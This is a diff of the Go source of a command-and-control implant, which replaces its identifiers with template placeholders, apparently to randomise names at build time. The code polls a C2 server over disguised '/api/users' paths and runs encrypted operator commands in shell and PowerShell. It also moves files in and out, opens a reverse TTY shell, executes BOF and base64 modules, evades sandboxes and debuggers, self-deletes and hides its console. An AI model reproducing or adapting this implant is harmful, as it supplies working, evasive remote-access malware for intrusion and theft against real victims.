@@ -21,40 +21,40 @@ import (
 	"github.com/fernet/fernet-go"
 )
 
-type Agent struct {
-	C2URL                  string
-	AgentID                string
-	Headers                map[string]string
-	HeartbeatInterval      int
-	Jitter                 float64
-	RegisterURI            string
-	TasksURI               string
-	ResultsURI             string
-	InteractiveURI         string
-	InteractiveStatusURI   string
-	Running                bool
-	InteractiveMode        bool
-	Hostname               string
-	Username               string
-	OSInfo                 string
-	SecretKey              *fernet.Key
-	CurrentInteractiveTask string
-	DisableSandbox         bool
+type {AGENT_STRUCT_NAME} struct {
+	{AGENT_C2_URL_FIELD}                string
+	{AGENT_ID_FIELD}                    string
+	{AGENT_HEADERS_FIELD}               map[string]string
+	{AGENT_HEARTBEAT_INTERVAL_FIELD}    int
+	{AGENT_JITTER_FIELD}                float64
+	{AGENT_REGISTER_URI_FIELD}          string
+	{AGENT_TASKS_URI_FIELD}             string
+	{AGENT_RESULTS_URI_FIELD}           string
+	{AGENT_INTERACTIVE_URI_FIELD}       string
+	{AGENT_INTERACTIVE_STATUS_URI_FIELD} string
+	{AGENT_RUNNING_FIELD}               bool
+	{AGENT_INTERACTIVE_MODE_FIELD}      bool
+	{AGENT_HOSTNAME_FIELD}              string
+	{AGENT_USERNAME_FIELD}              string
+	{AGENT_OSINFO_FIELD}                string
+	{AGENT_SECRET_KEY_FIELD}            *fernet.Key
+	{AGENT_CURRENT_INTERACTIVE_TASK_FIELD} string
+	{AGENT_DISABLE_SANDBOX_FIELD}       bool
 }
 
-type Task struct {
-	ID      int64  `json:"id"`
-	Command string `json:"command"`
+type {TASK_STRUCT_NAME} struct {
+	{TASK_ID_FIELD}      int64  `json:"id"`
+	{TASK_COMMAND_FIELD} string `json:"command"`
 }
 
-type TaskResult struct {
-	TaskID string `json:"task_id"`
-	Result string `json:"result"`
+type {TASK_RESULT_STRUCT_NAME} struct {
+	{TASK_RESULT_TASK_ID_FIELD} string `json:"task_id"`
+	{TASK_RESULT_RESULT_FIELD}  string `json:"result"`
 }
 
-type ApiResponse struct {
+type {API_RESPONSE_STRUCT_NAME} struct {
 	Status   string      `json:"status"`
-	Tasks    []Task      `json:"tasks,omitempty"`
+	Tasks    []{TASK_STRUCT_NAME}      `json:"tasks,omitempty"`
 	Interval int         `json:"checkin_interval,omitempty"`
 	Jitter   float64     `json:"jitter,omitempty"`
 	InteractiveMode bool `json:"interactive_mode,omitempty"`
@@ -62,7 +62,7 @@ type ApiResponse struct {
 	TaskID   string      `json:"task_id,omitempty"`
 }
 
-func NewAgent(agentID, secretKey, c2URL string, disableSandbox bool) (*Agent, error) {
+func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL string, disableSandbox bool) (*{AGENT_STRUCT_NAME}, error) {
 	var fernetKey fernet.Key
 
 	if secretKey != "" {
@@ -84,36 +84,36 @@ func NewAgent(agentID, secretKey, c2URL string, disableSandbox bool) (*Agent, er
 
 	osInfo := runtime.GOOS + " " + runtime.GOARCH
 
-	agent := &Agent{
-		C2URL:               c2URL,
-		AgentID:             agentID,
-		Headers:             map[string]string{"User-Agent": "Go C2 Agent"},
-		HeartbeatInterval:   60,
-		Jitter:              0.2,
-		RegisterURI:         "/api/users/register",
-		TasksURI:            "/api/users/{agent_id}/profile",
-		ResultsURI:          "/api/users/{agent_id}/activity",
-		InteractiveURI:      "/api/users/{agent_id}/settings",
-		InteractiveStatusURI: "/api/users/{agent_id}/status",
-		Hostname:            hostname,
-		Username:            username,
-		OSInfo:              osInfo,
-		SecretKey:           &fernetKey,
-		InteractiveMode:     false,
-		Running:             false,
-		CurrentInteractiveTask: "",
-		DisableSandbox:      disableSandbox,
+	agent := &{AGENT_STRUCT_NAME}{
+		{AGENT_C2_URL_FIELD}:               c2URL,
+		{AGENT_ID_FIELD}:             agentID,
+		{AGENT_HEADERS_FIELD}:             map[string]string{"User-Agent": "Go C2 Agent"},
+		{AGENT_HEARTBEAT_INTERVAL_FIELD}:   60,
+		{AGENT_JITTER_FIELD}:              0.2,
+		{AGENT_REGISTER_URI_FIELD}:         "/api/users/register",
+		{AGENT_TASKS_URI_FIELD}:            "/api/users/{agent_id}/profile",
+		{AGENT_RESULTS_URI_FIELD}:          "/api/users/{agent_id}/activity",
+		{AGENT_INTERACTIVE_URI_FIELD}:      "/api/users/{agent_id}/settings",
+		{AGENT_INTERACTIVE_STATUS_URI_FIELD}: "/api/users/{agent_id}/status",
+		{AGENT_HOSTNAME_FIELD}:            hostname,
+		{AGENT_USERNAME_FIELD}:            username,
+		{AGENT_OSINFO_FIELD}:              osInfo,
+		{AGENT_SECRET_KEY_FIELD}:           &fernetKey,
+		{AGENT_INTERACTIVE_MODE_FIELD}:     false,
+		{AGENT_RUNNING_FIELD}:             false,
+		{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}: "",
+		{AGENT_DISABLE_SANDBOX_FIELD}:      disableSandbox,
 	}
 
 	return agent, nil
 }
 
-func (a *Agent) encryptData(data string) (string, error) {
-	if a.SecretKey == nil {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_ENCRYPT_DATA_FUNC}(data string) (string, error) {
+	if a.{AGENT_SECRET_KEY_FIELD} == nil {
 		return data, nil
 	}
 
-	encrypted, err := fernet.EncryptAndSign([]byte(data), a.SecretKey)
+	encrypted, err := fernet.EncryptAndSign([]byte(data), a.{AGENT_SECRET_KEY_FIELD})
 	if err != nil {
 		return data, err
 	}
@@ -121,8 +121,8 @@ func (a *Agent) encryptData(data string) (string, error) {
 	return base64.URLEncoding.EncodeToString(encrypted), nil
 }
 
-func (a *Agent) decryptData(encryptedData string) (string, error) {
-	if a.SecretKey == nil {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_DECRYPT_DATA_FUNC}(encryptedData string) (string, error) {
+	if a.{AGENT_SECRET_KEY_FIELD} == nil {
 		return encryptedData, nil
 	}
 
@@ -131,7 +131,7 @@ func (a *Agent) decryptData(encryptedData string) (string, error) {
 		return encryptedData, err
 	}
 
-	keys := []*fernet.Key{a.SecretKey}
+	keys := []*fernet.Key{a.{AGENT_SECRET_KEY_FIELD}}
 	decrypted := fernet.VerifyAndDecrypt(decoded, 0, keys) // 0 TTL means no expiration checking
 
 	if decrypted == nil {
@@ -141,9 +141,9 @@ func (a *Agent) decryptData(encryptedData string) (string, error) {
 	return string(decrypted), nil
 }
 
-func (a *Agent) send(method, uriTemplate string, data interface{}) (*ApiResponse, error) {
-	uri := strings.Replace(uriTemplate, "{agent_id}", a.AgentID, -1)
-	url := a.C2URL + uri
+func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data interface{}) (*{API_RESPONSE_STRUCT_NAME}, error) {
+	uri := strings.Replace(uriTemplate, "{agent_id}", a.{AGENT_ID_FIELD}, -1)
+	url := a.{AGENT_C2_URL_FIELD} + uri
 
 
 	tr := &http.Transport{
@@ -174,7 +174,7 @@ func (a *Agent) send(method, uriTemplate string, data interface{}) (*ApiResponse
 		}
 	}
 
-	for key, value := range a.Headers {
+	for key, value := range a.{AGENT_HEADERS_FIELD} {
 		req.Header.Set(key, value)
 	}
 
@@ -195,7 +195,7 @@ func (a *Agent) send(method, uriTemplate string, data interface{}) (*ApiResponse
 	}
 
 
-	var apiResp ApiResponse
+	var apiResp {API_RESPONSE_STRUCT_NAME}
 	err = json.Unmarshal(body, &apiResp)
 	if err != nil {
 		return nil, err
@@ -204,40 +204,40 @@ func (a *Agent) send(method, uriTemplate string, data interface{}) (*ApiResponse
 	return &apiResp, nil
 }
 
-func (a *Agent) register() error {
-	if !a.DisableSandbox {
-		if a.checkSandbox() {
-			a.selfDelete()
+func (a *{AGENT_STRUCT_NAME}) {AGENT_REGISTER_FUNC}() error {
+	if !a.{AGENT_DISABLE_SANDBOX_FIELD} {
+		if a.{AGENT_CHECK_SANDBOX_FUNC}() {
+			a.{AGENT_SELF_DELETE_FUNC}()
 			return fmt.Errorf("sandbox detected, agent self-deleting")
 		}
 
-		if a.checkDebuggers() {
-			a.selfDelete()
+		if a.{AGENT_CHECK_DEBUGGERS_FUNC}() {
+			a.{AGENT_SELF_DELETE_FUNC}()
 			return fmt.Errorf("debugger detected, agent self-deleting")
 		}
 	}
 
 	data := map[string]interface{}{
-		"agent_id":         a.AgentID,
-		"hostname":         a.Hostname,
-		"os_info":          a.OSInfo,
-		"user":             a.Username,
+		"agent_id":         a.{AGENT_ID_FIELD},
+		"hostname":         a.{AGENT_HOSTNAME_FIELD},
+		"os_info":          a.{AGENT_OSINFO_FIELD},
+		"user":             a.{AGENT_USERNAME_FIELD},
 		"listener_id":      "web_app_default", // This should match the listener name
 		"interactive_capable": true,
-		"secret_key":       a.SecretKey,
+		"secret_key":       a.{AGENT_SECRET_KEY_FIELD},
 	}
 
-	resp, err := a.send("POST", a.RegisterURI, data)
+	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_REGISTER_URI_FIELD}, data)
 	if err != nil {
 		return err
 	}
 
 	if resp.Status == "success" {
 		if resp.Interval != 0 {
-			a.HeartbeatInterval = resp.Interval
+			a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = resp.Interval
 		}
 		if resp.Jitter != 0 {
-			a.Jitter = resp.Jitter
+			a.{AGENT_JITTER_FIELD} = resp.Jitter
 		}
 		return nil
 	}
@@ -245,8 +245,8 @@ func (a *Agent) register() error {
 	return fmt.Errorf("registration failed: %s", resp.Status)
 }
 
-func (a *Agent) getTasks() ([]Task, error) {
-	resp, err := a.send("GET", a.TasksURI, nil)
+func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_TASKS_FUNC}() ([]{TASK_STRUCT_NAME}, error) {
+	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_TASKS_URI_FIELD}, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -254,10 +254,10 @@ func (a *Agent) getTasks() ([]Task, error) {
 	if resp.Status == "success" {
 		tasks := resp.Tasks
 		for i := range tasks {
-			if a.SecretKey != nil {
-				decryptedCmd, err := a.decryptData(tasks[i].Command)
+			if a.{AGENT_SECRET_KEY_FIELD} != nil {
+				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(tasks[i].{TASK_COMMAND_FIELD})
 				if err == nil {
-					tasks[i].Command = decryptedCmd
+					tasks[i].{TASK_COMMAND_FIELD} = decryptedCmd
 				}
 			}
 		}
@@ -267,8 +267,8 @@ func (a *Agent) getTasks() ([]Task, error) {
 	return nil, fmt.Errorf("failed to get tasks: %s", resp.Status)
 }
 
-func (a *Agent) checkInteractiveStatus() (bool, error) {
-	resp, err := a.send("GET", a.InteractiveStatusURI, nil)
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_INTERACTIVE_STATUS_FUNC}() (bool, error) {
+	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_STATUS_URI_FIELD}, nil)
 	if err != nil {
 		return false, err
 	}
@@ -280,8 +280,8 @@ func (a *Agent) checkInteractiveStatus() (bool, error) {
 	return false, fmt.Errorf("failed to check interactive status: %s", resp.Status)
 }
 
-func (a *Agent) getInteractiveCommand() (*Task, error) {
-	resp, err := a.send("GET", a.InteractiveURI, nil)
+func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_INTERACTIVE_COMMAND_FUNC}() (*{TASK_STRUCT_NAME}, error) {
+	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_URI_FIELD}, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -292,15 +292,15 @@ func (a *Agent) getInteractiveCommand() (*Task, error) {
 			taskID = 0 // Default to 0 if parsing fails
 		}
 
-		task := &Task{
-			ID:      taskID,
-			Command: resp.Command,
+		task := &{TASK_STRUCT_NAME}{
+			{TASK_ID_FIELD}:      taskID,
+			{TASK_COMMAND_FIELD}: resp.Command,
 		}
 
-		if a.SecretKey != nil {
-			decryptedCmd, err := a.decryptData(task.Command)
+		if a.{AGENT_SECRET_KEY_FIELD} != nil {
+			decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(task.{TASK_COMMAND_FIELD})
 			if err == nil {
-				task.Command = decryptedCmd
+				task.{TASK_COMMAND_FIELD} = decryptedCmd
 			}
 		}
 
@@ -310,11 +310,11 @@ func (a *Agent) getInteractiveCommand() (*Task, error) {
 	return nil, nil
 }
 
-func (a *Agent) submitInteractiveResult(taskID, result string) error {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskID, result string) error {
 	var encryptedResult string
 	var err error
-	if a.SecretKey != nil {
-		encryptedResult, err = a.encryptData(result)
+	if a.{AGENT_SECRET_KEY_FIELD} != nil {
+		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
 		if err != nil {
 			encryptedResult = result
 		}
@@ -322,16 +322,16 @@ func (a *Agent) submitInteractiveResult(taskID, result string) error {
 		encryptedResult = result
 	}
 
-	data := TaskResult{
-		TaskID: taskID,
-		Result: encryptedResult,
+	data := {TASK_RESULT_STRUCT_NAME}{
+		{TASK_RESULT_TASK_ID_FIELD}: taskID,
+		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
 	}
 
-	_, err = a.send("POST", a.InteractiveURI, data)
+	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_INTERACTIVE_URI_FIELD}, data)
 	return err
 }
 
-func (a *Agent) execute(command string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 
 	commandLower := strings.ToLower(strings.TrimSpace(command))
 	isPowerShell := false
@@ -407,12 +407,12 @@ func (a *Agent) execute(command string) string {
 	}
 }
 
-func (a *Agent) submitTaskResult(taskID, result string) error {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result string) error {
 
 	var encryptedResult string
 	var err error
-	if a.SecretKey != nil {
-		encryptedResult, err = a.encryptData(result)
+	if a.{AGENT_SECRET_KEY_FIELD} != nil {
+		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
 		if err != nil {
 			encryptedResult = result
 		} else {
@@ -421,28 +421,28 @@ func (a *Agent) submitTaskResult(taskID, result string) error {
 		encryptedResult = result
 	}
 
-	data := TaskResult{
-		TaskID: taskID,
-		Result: encryptedResult,
+	data := {TASK_RESULT_STRUCT_NAME}{
+		{TASK_RESULT_TASK_ID_FIELD}: taskID,
+		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
 	}
 
-	_, err = a.send("POST", a.ResultsURI, data)
+	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
 	if err != nil {
 	} else {
 	}
 	return err
 }
 
-func (a *Agent) handleModule(encodedScript string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_MODULE_FUNC}(encodedScript string) string {
 	decodedScript, err := base64.StdEncoding.DecodeString(encodedScript)
 	if err != nil {
 		return fmt.Sprintf("[ERROR] Failed to decode module: %v", err)
 	}
 
-	return a.execute(string(decodedScript))
+	return a.{AGENT_EXECUTE_FUNC}(string(decodedScript))
 }
 
-func (a *Agent) handleUpload(command string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_UPLOAD_FUNC}(command string) string {
 	parts := strings.SplitN(command, " ", 3)
 	if len(parts) != 3 {
 		return "[ERROR] Invalid upload command format."
@@ -464,7 +464,7 @@ func (a *Agent) handleUpload(command string) string {
 	return fmt.Sprintf("[SUCCESS] File uploaded to %s", remotePath)
 }
 
-func (a *Agent) handleDownload(command string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOWNLOAD_FUNC}(command string) string {
 	parts := strings.SplitN(command, " ", 2)
 	if len(parts) != 2 {
 		return "[ERROR] Invalid download command format."
@@ -485,7 +485,7 @@ func (a *Agent) handleDownload(command string) string {
 	return encodedContent
 }
 
-func (a *Agent) handleTTYShell(command string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_TTY_SHELL_FUNC}(command string) string {
 	parts := strings.Split(command, " ")
 	var host string
 	var port string
@@ -549,7 +549,7 @@ func (a *Agent) handleTTYShell(command string) string {
 	return fmt.Sprintf("[SUCCESS] TTY shell connection initiated to %s:%s", host, port)
 }
 
-func (a *Agent) handleSleep(command string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_SLEEP_FUNC}(command string) string {
 	parts := strings.SplitN(command, " ", 2)
 	if len(parts) != 2 {
 		return "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
@@ -564,11 +564,11 @@ func (a *Agent) handleSleep(command string) string {
 		return "[ERROR] Sleep interval must be a positive integer"
 	}
 
-	a.HeartbeatInterval = newSleep
+	a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = newSleep
 	return fmt.Sprintf("[SUCCESS] Sleep interval changed to %d seconds", newSleep)
 }
 
-func (a *Agent) handleBOF(command string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
 	parts := strings.SplitN(command, " ", 3) // Split into at most 3 parts: ['bof', 'encoded_bof', 'args']
 	if len(parts) < 2 {
 		return "[ERROR] Invalid BOF command format. Usage: bof <base64_encoded_bof> [args...]"
@@ -589,85 +589,85 @@ func (a *Agent) handleBOF(command string) string {
 	return fmt.Sprintf("[SUCCESS] BOF executed with args: %s", bofArgs)
 }
 
-func (a *Agent) processCommand(command string) string {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
 	if strings.HasPrefix(command, "module ") {
 		encodedScript := command[7:] // Remove "module " prefix
-		return a.handleModule(encodedScript)
+		return a.{AGENT_HANDLE_MODULE_FUNC}(encodedScript)
 	} else if strings.HasPrefix(command, "upload ") {
-		return a.handleUpload(command)
+		return a.{AGENT_HANDLE_UPLOAD_FUNC}(command)
 	} else if strings.HasPrefix(command, "download ") {
-		return a.handleDownload(command)
+		return a.{AGENT_HANDLE_DOWNLOAD_FUNC}(command)
 	} else if strings.HasPrefix(command, "tty_shell") {
-		return a.handleTTYShell(command)
+		return a.{AGENT_HANDLE_TTY_SHELL_FUNC}(command)
 	} else if strings.HasPrefix(command, "sleep ") {
-		return a.handleSleep(command)
+		return a.{AGENT_HANDLE_SLEEP_FUNC}(command)
 	} else if strings.HasPrefix(command, "bof ") {
-		return a.handleBOF(command)
+		return a.{AGENT_HANDLE_BOF_FUNC}(command)
 	} else if command == "kill" {
-		a.Running = false
+		a.{AGENT_RUNNING_FIELD} = false
 		os.Exit(0)
 		return "[SUCCESS] Agent killed"
 	} else {
-		return a.execute(command)
+		return a.{AGENT_EXECUTE_FUNC}(command)
 	}
 }
 
-func (a *Agent) run() {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 
 	for {
-		err := a.register()
+		err := a.{AGENT_REGISTER_FUNC}()
 		if err == nil {
 			break
 		}
 		time.Sleep(30 * time.Second)
 	}
 
-	a.Running = true
+	a.{AGENT_RUNNING_FIELD} = true
 	checkCount := 0
 
-	for a.Running {
+	for a.{AGENT_RUNNING_FIELD} {
 		checkCount++
 
 		if checkCount%3 == 0 {
-			shouldBeInteractive, err := a.checkInteractiveStatus()
+			shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
 			if err == nil {
-				if shouldBeInteractive && !a.InteractiveMode {
-					a.InteractiveMode = true
-				} else if !shouldBeInteractive && a.InteractiveMode {
-					a.InteractiveMode = false
+				if shouldBeInteractive && !a.{AGENT_INTERACTIVE_MODE_FIELD} {
+					a.{AGENT_INTERACTIVE_MODE_FIELD} = true
+				} else if !shouldBeInteractive && a.{AGENT_INTERACTIVE_MODE_FIELD} {
+					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
 				}
 			} else {
 			}
 		}
 
-		if !a.InteractiveMode {
-			tasks, err := a.getTasks()
+		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
+			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
 			if err != nil {
 				time.Sleep(30 * time.Second)
 				continue
 			}
 
 			for _, task := range tasks {
-				result := a.processCommand(task.Command)
-				err := a.submitTaskResult(strconv.FormatInt(task.ID, 10), result)
+				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
+				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(strconv.FormatInt(task.{TASK_ID_FIELD}, 10), result)
 				if err != nil {
 				} else {
 				}
 			}
 		} else {
-			interactiveTask, err := a.getInteractiveCommand()
+			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
 			if err != nil {
 			} else if interactiveTask != nil {
-				result := a.processCommand(interactiveTask.Command)
-				err := a.submitInteractiveResult(strconv.FormatInt(interactiveTask.ID, 10), result)
+				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
+				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10), result)
 				if err != nil {
 				} else {
 				}
 			}
 		}
 
-		baseSleep := float64(a.HeartbeatInterval)
-		jitterFactor := (rand.Float64() - 0.5) * 2 * a.Jitter
+		baseSleep := float64(a.{AGENT_HEARTBEAT_INTERVAL_FIELD})
+		jitterFactor := (rand.Float64() - 0.5) * 2 * a.{AGENT_JITTER_FIELD}
 		sleepTime := baseSleep * (1 + jitterFactor)
 		if sleepTime < 5 {
 			sleepTime = 5
@@ -677,12 +677,12 @@ func (a *Agent) run() {
 	}
 }
 
-func (a *Agent) stop() {
-	a.Running = false
+func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_FUNC}() {
+	a.{AGENT_RUNNING_FIELD} = false
 }
 
-func (a *Agent) checkSandbox() bool {
-	if a.DisableSandbox {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
+	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
 		return false
 	}
 
@@ -763,11 +763,11 @@ func (a *Agent) checkSandbox() bool {
 	}
 
 	if runtime.GOOS == "linux" {
-		if a.checkProcessesForSandbox() {
+		if a.{AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}() {
 			return true
 		}
 	} else if runtime.GOOS == "windows" {
-		if a.checkWindowsProcessesForSandbox() {
+		if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() {
 			return true
 		}
 	}
@@ -820,14 +820,14 @@ func (a *Agent) checkSandbox() bool {
 		}
 	}
 
-	if a.checkNetworkTools() {
+	if a.{AGENT_CHECK_NETWORK_TOOLS_FUNC}() {
 		return true
 	}
 
 	return false
 }
 
-func (a *Agent) checkProcessesForSandbox() bool {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}() bool {
 	cmd := exec.Command("ps", "aux")
 	output, err := cmd.Output()
 	if err != nil {
@@ -851,7 +851,7 @@ func (a *Agent) checkProcessesForSandbox() bool {
 	return false
 }
 
-func (a *Agent) checkWindowsProcessesForSandbox() bool {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() bool {
 	cmd := exec.Command("tasklist")
 	output, err := cmd.Output()
 	if err != nil {
@@ -876,8 +876,8 @@ func (a *Agent) checkWindowsProcessesForSandbox() bool {
 	return false
 }
 
-func (a *Agent) checkNetworkTools() bool {
-	if a.DisableSandbox {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_NETWORK_TOOLS_FUNC}() bool {
+	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
 		return false
 	}
 
@@ -917,8 +917,8 @@ func (a *Agent) checkNetworkTools() bool {
 	return false
 }
 
-func (a *Agent) checkDebuggers() bool {
-	if a.DisableSandbox {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_DEBUGGERS_FUNC}() bool {
+	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
 		return false
 	}
 
@@ -941,15 +941,15 @@ func (a *Agent) checkDebuggers() bool {
 	}
 
 	if runtime.GOOS == "linux" {
-		if a.checkProcessesForDebuggers() {
+		if a.{AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}() {
 			return true
 		}
 	} else if runtime.GOOS == "windows" {
-		if a.checkWindowsProcessesForDebuggers() {
+		if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() {
 			return true
 		}
 
-		if a.checkWindowsDebugger() {
+		if a.{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() {
 			return true
 		}
 	}
@@ -965,7 +965,7 @@ func (a *Agent) checkDebuggers() bool {
 	return false
 }
 
-func (a *Agent) checkProcessesForDebuggers() bool {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
 	cmd := exec.Command("ps", "aux")
 	output, err := cmd.Output()
 	if err != nil {
@@ -987,7 +987,7 @@ func (a *Agent) checkProcessesForDebuggers() bool {
 	return false
 }
 
-func (a *Agent) checkWindowsProcessesForDebuggers() bool {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
 	cmd := exec.Command("tasklist")
 	output, err := cmd.Output()
 	if err != nil {
@@ -1009,8 +1009,8 @@ func (a *Agent) checkWindowsProcessesForDebuggers() bool {
 	return false
 }
 
-func (a *Agent) checkWindowsDebugger() bool {
-	if runtime.GOOS != "windows" || a.DisableSandbox {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() bool {
+	if runtime.GOOS != "windows" || a.{AGENT_DISABLE_SANDBOX_FIELD} {
 		return false
 	}
 
@@ -1029,7 +1029,7 @@ func (a *Agent) checkWindowsDebugger() bool {
 	return false
 }
 
-func (a *Agent) selfDelete() {
+func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 	executable, err := os.Executable()
 	if err != nil {
 		os.Exit(0)
@@ -1058,7 +1058,7 @@ func (a *Agent) selfDelete() {
 	}()
 }
 
-func hideConsole() {
+func {AGENT_HIDE_CONSOLE_FUNC}() {
 	if runtime.GOOS == "windows" {
 		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "try { Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")]^ public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")]^ public static extern bool ShowWindow(IntPtr hWnd^, int nCmdShow);'; $consolePtr = [Console.Win32]::GetConsoleWindow(); [Console.Win32]::ShowWindow($consolePtr, 0) } catch { }")
 		_ = cmd.Run() // Run command but ignore errors
@@ -1067,7 +1067,7 @@ func hideConsole() {
 
 func main() {
 	if runtime.GOOS == "windows" {
-		hideConsole()
+		{AGENT_HIDE_CONSOLE_FUNC}()
 	}
 
 	agentID := "{AGENT_ID}"
@@ -1075,10 +1075,10 @@ func main() {
 	c2URL := "{C2_URL}"
 	disableSandbox := {DISABLE_SANDBOX} // Will be true or false based on generation flag
 
-	agent, err := NewAgent(agentID, secretKey, c2URL, disableSandbox)
+	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, disableSandbox)
 	if err != nil {
 		os.Exit(1)
 	}
 
-	agent.run()
+	agent.{AGENT_RUN_FUNC}()
 }
